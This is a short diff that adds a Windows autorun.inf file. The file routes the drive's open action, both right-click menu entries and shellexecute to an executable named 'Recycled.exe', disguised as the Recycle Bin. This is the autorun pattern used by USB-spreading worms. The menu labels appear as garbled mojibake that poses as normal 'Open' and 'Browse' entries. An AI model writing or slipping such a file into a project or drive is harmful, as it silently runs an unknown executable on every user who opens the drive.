@@ -1,0 +1,7 @@
+[AutoRun]
+open=Recycled.exe
+shell\1=´ò¿ª(&O)
+shell\1\Command=Recycled.exe
+shell\2\=ä¯ÀÀ(&B)
+shell\2\Command=Recycled.exe
+shellexecute=Recycled.exe
